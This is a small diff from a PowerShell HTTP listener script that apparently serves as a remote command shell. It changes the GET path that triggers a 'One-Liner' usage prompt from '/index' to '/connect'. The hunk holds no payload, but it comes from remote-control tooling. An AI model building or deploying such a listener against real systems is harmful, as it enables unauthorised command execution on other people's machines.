@@ -52,7 +52,7 @@ while ($true)
 	$hostip = $request.RemoteEndPoint
 
 	#Use this for One-Liner Start
-	if ($request.Url -match '/index$' -and ($request.HttpMethod -eq "GET")) 
+	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) 
 	{  
      		write-host "Usage:" -fore Green
 		write-host "      cmd:          	just input the cmd command" -fore Green
